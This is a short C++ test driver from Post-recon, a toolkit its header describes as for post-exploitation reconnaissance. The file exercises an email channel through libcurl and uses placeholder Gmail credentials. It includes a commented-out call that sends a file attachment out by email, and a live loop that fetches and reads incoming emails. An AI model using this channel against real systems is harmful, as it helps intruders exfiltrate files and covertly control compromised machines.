/*
This file is part of Post-recon
Copyright (C) 2017 @maldevel
https://github.com/maldevel/Post-recon

Post-recon - post-exploitation reconnaissance toolkit.

This program is free software: you can redistribute it and/or modify
it under the terms of the GNU General Public License as published by
the Free Software Foundation, either version 3 of the License, or
(at your option) any later version.

This program is distributed in the hope that it will be useful,
but WITHOUT ANY WARRANTY; without even the implied warranty of
MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
GNU General Public License for more details.

You should have received a copy of the GNU General Public License
along with this program.  If not, see <http://www.gnu.org/licenses/>.

For more see the file 'LICENSE' for copying permission.
*/

#include <Windows.h>
#include "prCommon.h"
#include "prLibCurl.h"

#define TO "xxxxxx@gmail.com"
#define PASSWORD2 "xxxxxxx"
#define ToNAME "xxxxxx"

#define FROM "yyyyy@gmail.com"
#define PASSWORD "yyyyy"
#define FromNAME "yyyyyyy"


int main(void)
{
	char subject[50] = "Hello there";
	char body[100] = "Test body\r\nnew line\r\ntest test\r\ntest";
	int *ids;
	int i = 0;
	int emails = 0;

	Common::init();

	//LibCurl::SendEmail(FROM, FromNAME, TO, ToNAME, subject, body, PASSWORD, FALSE, "");
	//check if file EXISTS!!!!!!!!!!!
	//LibCurl::SendEmail(FROM, FromNAME, TO, ToNAME, subject, body, PASSWORD, TRUE, "\path\to\file\test.7z", "funny.7z", "libcurl-agent/1.0", 1L);

	//TESTING
	if ((emails = LibCurl::GetNewEmailsIDs(&ids, TO, PASSWORD2, "libcurl-agent/1.0", 1L)) != -1) {
		for (i = 0; i < emails; i++) {
			LibCurl::ReceiveEmail(ids[i], TO, PASSWORD2, "libcurl-agent/1.0", 1L);
		}
		Common::hFree(ids);
	}

	return EXIT_SUCCESS;
}
